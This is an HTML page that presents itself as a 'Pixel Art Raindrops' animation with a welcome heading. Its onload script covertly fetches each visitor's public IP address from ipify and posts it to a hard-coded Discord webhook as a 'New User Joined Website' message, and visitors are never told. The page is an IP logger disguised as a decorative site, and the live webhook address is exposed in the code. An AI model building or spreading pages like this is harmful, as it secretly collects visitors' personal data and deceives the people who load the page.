<!DOCTYPE html>
<html>
<head>
    <title>Pixel Art Raindrops</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            background-color: black;
        }

        /* Text styles */
        body {
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
            z-index: 2; /* Set a higher z-index to place the text above the raindrops */
        }

        /* Raindrop styles */
        .raindrop-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1; /* Set a lower z-index to place the raindrops behind the text */
        }

        .raindrop {
            position: absolute;
            width: 7px;
            height: 7px;
            background-color: white;
            animation: falling 2s linear infinite;
        }

        @keyframes falling {
            to {
                transform: translateY(100vh);
            }
        }

        /* Generate random position for raindrops */
        @keyframes randomize {
            0% {
                transform: translateX(0);
            }
            100% {
                transform: translateX(calc(100vw - 10px));
            }
        }

        /* Apply random horizontal position and negative top position to each raindrop */
        .raindrop:before {
            content: "";
            position: absolute;
            width: 10px;
            height: 10px;
            top: -20px; /* Increase the space between the text and raindrops */
            animation: randomize 2s linear infinite;
        }

        /* Delay each raindrop randomly to create the animation effect */
        .raindrop:nth-child(1) {
            animation-delay: 0.5s;
        }
        .raindrop:nth-child(2) {
            animation-delay: 0.3s;
        }
        .raindrop:nth-child(3) {
            animation-delay: 0.7s;
        }
        /* Add more raindrops as desired */
    </style>
</head>
<body>
    <!-- Generate 50 white 7x7 pixel raindrops -->
    <div class="raindrop-container">
        <div class="raindrop"></div>
        <div class="raindrop"></div>
        <!-- Add 48 more raindrops -->
        <div class="raindrop"></div>
        <div class="raindrop"></div>
        <!-- Add more raindrops as desired -->
    </div>

    <!-- Optional: You can also include text or other elements on the webpage -->
    <h1>Welcome to the Website</h1>
    <p>Move your mouse to see the raindrop effect!</p>

    <script>
        window.onload = function() {
            const body = document.body;
            const maxRaindrops = 50; // Adjust the number of raindrops

            // Function to create a raindrop with a delay
            function createRaindropWithDelay(delay) {
                setTimeout(function() {
                    const raindrop = document.createElement('div');
                    raindrop.className = 'raindrop';
                    raindrop.style.backgroundColor = 'white';
                    raindrop.style.left = Math.random() * window.innerWidth + 'px'; // Random left position
                    body.querySelector('.raindrop-container').appendChild(raindrop);
                }, delay);
            }

            // Generate raindrops with individual delays
            for (let i = 0; i < maxRaindrops; i++) {
                createRaindropWithDelay(i * 200); // Adjust the delay as needed
            }

            // Function to get the user's IP address
            async function getUserIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    const userIP = data.ip;

                    // Send the IP address as an embed to the Discord webhook
                    sendToDiscordWebhook(userIP);
                } catch (error) {
                    console.error('Error fetching IP address:', error);
                }
            }

            // Function to send the IP address as an embed to the Discord webhook
            function sendToDiscordWebhook(ip) {
                const webhookURL = 'https://discord.com/api/webhooks/1127106984328568853/uq1NEGHpCDPyn8MXvV9ZHlOFURtauU5JXMjcAY0mWs42xIwN3AdzxZd0o08tC2NBxXit';
                const payload = {
                    embeds: [
                        {
                            title: 'New User Joined Website', // Updated title
                            description: `User IP Address: ${ip}`,
                            color: 0 // Black color for the embed
                        }
                    ]
                };

                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                }).catch(error => {
                    console.error('Error sending data to Discord webhook:', error);
                });
            }

            // Get the user's IP address when the window loads
            getUserIP();
        };
    </script>
</body>
</html>
